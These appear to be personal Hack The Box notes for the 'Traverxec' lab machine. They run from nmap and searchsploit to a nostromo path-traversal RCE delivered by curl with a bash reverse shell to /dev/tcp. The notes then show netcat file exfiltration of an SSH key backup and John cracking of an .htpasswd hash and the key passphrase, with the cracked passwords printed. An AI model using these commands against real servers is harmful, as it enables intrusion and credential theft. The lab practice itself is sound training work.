#HackTheBox  #linux 
# 1- Enum
PORT   STATE    SERVICE VERSION
22/tcp open     ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa99a81668cd41ccf96c8401c759095c (RSA)
|   256 93dd1a23eed71f086b58470973a388cc (ECDSA)
|_  256 9dd6621e7afb8f5692e637f110db9bce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

┌──(root㉿kali)-[~]
└─# searchsploit nostromo 1.9.6
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
nostromo 1.9.6 - Remote Code Execution                               | multiple/remote/47837.py
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                       
┌──(root㉿kali)-[~]
└─# searchsploit -m 47837      
  Exploit: nostromo 1.9.6 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47837
     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
    Codes: CVE-2019-16278
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /root/47837.py
                                                                                                       
┌──(root㉿kali)-[~]
└─# ls
47837.py

┌──(root㉿kali)-[~/HTB]
└─# cat 47837.py
	[...]
	payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh
	[...]

┌──(root㉿kali)-[~]
└─# curl -X POST http://10.129.229.26/.%0d./.%0d./.%0d./bin/sh -d 'bash -c "bash -i >& /dev/tcp/10.10.17.161/445 0>&1"'

# Foothold
┌──(root㉿kali)-[~]
└─# nc -lnvp 445             
listening on [any] 445 ...
connect to [10.10.17.161] from (UNKNOWN) [10.129.229.26] 50282
bash: cannot set terminal process group (800): Inappropriate ioctl for device
bash: no job control in this shell
[www-data@traverxec:/usr/bin$] (linpeas)
	╔══════════╣ Analyzing Htpasswd Files (limit 70)
	-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd                                     
	[david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/]
	
┌──(root㉿kali)-[~/HTB]
└─# echo "david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/" > hash

┌──(root㉿kali)-[~/HTB]
└─# john hash -wordlist=/usr/share/wordlists/rockyou.txt
	[Nowonly4me]       ([david]) 
	
┌──(root㉿kali)-[~]
└─# nc -lvp 445 > key
[www-data@traverxec:/home/david/public_www/protected-file-area$] nc -w 3 10.10.17.161 445 < backup-ssh-identity-files.tgz

┌──(root㉿kali)-[~/HTB]
└─# gzip -d key.tgz

┌──(root㉿kali)-[~/HTB]
└─# tar -x -f key.tar

## ssh geting
┌──(root㉿kali)-[~/HTB/home/david/.ssh]
└─# ssh2john id_rsa > ssh_hash

┌──(root㉿kali)-[~/HTB/home/david/.ssh]
└─# john ssh_hash -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[hunter]           ([id_rsa])

## Creds 
### ssh = david:passphrase(hunter)